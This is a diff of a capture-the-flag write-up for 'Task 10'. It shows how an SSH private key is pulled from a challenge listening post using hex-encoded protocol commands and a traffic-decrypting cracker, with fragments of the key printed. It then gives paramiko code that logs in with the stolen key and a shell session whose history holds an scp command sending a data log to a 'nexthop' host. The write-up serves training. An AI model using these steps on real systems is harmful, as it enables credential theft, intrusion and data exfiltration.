@@ -1,41 +1,31 @@
 # Task 10
 
-Right up front, I just wanted to highlight that this is a fairly raw brain dump of my adventures in task 10.  There are certainly some things that could be way cleaner, and likely some points that I did not 100% understand.  If you see something that is wrong, please let me know!  Let's dig in!
-
 For the final task, we need to gain access to the LP and discover the IP and port the `psuser` account transmitted data to.
 
 ## Obtaining the powershell LP binary
 We can leverage the capabilities we built for [task 9](../task-9/README.md) to locate and download an ssh private key to enable ssh access to the LP.  After a bit of poking around, we can see there is a private key at `/home/lpuser/.ssh/id_rsa`.  
 
-We can run the following commands using our `lpcomms` program to retrieve the file while capturing network traffic:
+We can run the following commands using our `lpcomms` program to retrieve the file while capturing network traffic in Wireshark:
 
 ```
-# check in
-1e32dca0170000020002170800101b8cbd03d5e64265b5155556e875c7dde5008fd6
-
-# list files in /home/lpuser/.ssh
-1e32dca0170000020004170800101b8cbd03d5e64265b5155556e875c7dd171400122f686f6d652f6c70757365722f2e73736800e5008fd6
-
-# download id_rsa from /home/lpuser/.ssh
-1e32dca0170000020005170800101b8cbd03d5e64265b5155556e875c7dd171400122f686f6d652f6c70757365722f2e73736800171c000769645f72736100e5008fd6
-
-# check out
-1e32dca0170000020007e5008fd6
+# initialize session
+115dcb2a6e00000200026e0800101b8cbd03d5e64265b5155556e875c7ddee37e614
+# download /home/lpuser/.ssh/id_rsa
+115dcb2a6e00000200056e0800101b8cbd03d5e64265b5155556e875c7dd6e1400122f686f6d652f6c70757365722f2e737368006e1c000769645f72736100ee37e614
 ```
 
-Now that we've captured the network traffic, we can parse the relevant data from the pcap and decrypt using our `cracker` program from [task 8](../task-8/README.md) to retrieve the key:
+Now that we've captured the network traffic, we can parse the relevant data from the pcap and decrypt using our [cracker](../task-8/cracker.cpp) program from [task 8](../task-8/README.md) to retrieve the key:
 
 ```bash
-./cracker names.txt versions lp_response_data.pcap
-...
-Username: unknown
-Time: 1636557906
-Version: +1.2.0.0+
-Key: 0e1d165647866e973f0b4140245b4d31941994ac580fc79b3d561cf07d0061ec
+Username: root
+Time: 1637111712
+Version: +3.3.3.3+
+Key: fee76d7693e1c3cdc6168b4fe40a5001523c6d4a6bdc05890ea83fa486330ff3
+Decrypted: 11 5d cb 2a 6e 20 06 8b 2d 2d 2d 2d 2d 42 - 4547494e-2052-5341-2050-524956415445 - 20 4b 45 59
 RAW:
-2ܠ �-----BEGIN RSA PRIVATE KEY-----
-MIIEpQIBAAKCAQEA1+ftsBNamXUQP5VPqp+Du0BeKyjRqZaZmeJ7xE+hVwuRlB9k
-nLHJzcO3FybNrlRgFsAsXhL+rqS3s1QJRF0JPALQASm7UjiCTRzb7TSSX6XhRFLh
+]�*n �-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAs63gAUxRcrQ5feev3zPMJGnVaelx9zaGYiLU+q7wNNSHExUK
+1v6jSyCyr634wl7x+K1rVk1CM1MeGTGW06vS/ilDnZeOwUR01I8NYSiIPDaMH7GP
 ...
 ```
 
@@ -794,6 +784,28 @@ ssh = paramiko.SSHClient()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 ssh.connect(server, username=username, pkey=key)
 ```
-Running our exploit against the real target, we successfully gain a shell as `psuser`.  Once we are in, a quick look at `.bash_history` reveals an SCP command to our target port with `nexthop` as the host.  Another quick glance at `/home/psuser/.ssh/config` reveals the IP of `nexthop`, and we have our answers for task 10!
+Running our exploit against the real target, we successfully gain a shell as `psuser`.  Once we are in, a quick look at `.bash_history` reveals an SCP command to our target port with `nexthop` as the host.  Another quick glance at `/home/psuser/.ssh/config` reveals the IP of `nexthop`, and we have our answers for task 10:
+
+```bash
+$ cat .bash_history
+ls -la
+date
+wc ps_*
+less ps_data.log
+less ps_server.log
+man scp
+scp -P 37335 ~/ps_data.log nexthop:
+
+$ cd .ssh
+$ ls
+config
+id_rsa
+id_rsa.pub
+$ cat config
+Host nexthop
+    Hostname: 10.83.142.128
+    User: user
+    IdentityFile: /home/psuser/.ssh/id_rsa
+```
 
 The full final exploit can be seen [here](exploit.py).
